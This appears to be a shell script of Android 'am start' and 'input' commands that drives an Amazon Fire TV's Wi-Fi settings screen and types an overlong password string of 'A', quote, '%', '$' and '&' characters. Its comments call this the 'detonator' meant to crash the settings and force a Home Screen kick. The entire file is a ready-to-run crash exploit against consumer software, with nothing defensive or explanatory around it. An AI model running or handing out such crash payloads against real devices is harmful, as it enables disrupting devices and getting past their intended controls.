# Start the Network settings (Amazon will re-route this to their Network tab, rather than Android's)
am start -a android.settings.WIFI_SETTINGS
sleep 2.5

# FAILSAFE IN CASE THE TOP NETWORK IS YOURS, AND ALREADY CONNECTED (lol)
if ip route | grep -q "wlan0"; then
    input keyevent 20; sleep 0.2; input keyevent 66
else
    input keyevent 61; sleep 0.2; input keyevent 66
fi
sleep 1.5

# Manually enter the string (Bunch of 'A', '%', and '$' signs)
# Go up to 'A'
# Hit Enter a bunch, until we hit the normal character limit (We have to do this manually, at least in my case)
# Go down to the 'Special Characters' section, and hit Enter (This is the detonator where the actual crash is gonna happen)
# Once on there, go Up + Right and hit Enter a bunch (string of '$')
# Hit Left + Up + Up and hit Enter a bunch (string of "")
# Hit Right + Enter a bunch (string of '%'), then hit Left to make the next part easier
# One last string of '$' (this makes the exploit work)
PAYLOAD_A="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
PAYLOAD_SPECIAL='""%%%%$$&&""%%%%$$&&%%%%$$&&'
input text "${PAYLOAD_A}${PAYLOAD_SPECIAL}"
sleep 0.5

# Hit 'Submit' to trigger the error, and (if we filled the memory up enough) Home Screen Kick
input keyevent 20; sleep 0.2
input keyevent 22; sleep 0.2
input keyevent 22; sleep 0.2
input keyevent 22; sleep 0.2
input keyevent 20; sleep 0.2
input keyevent 66
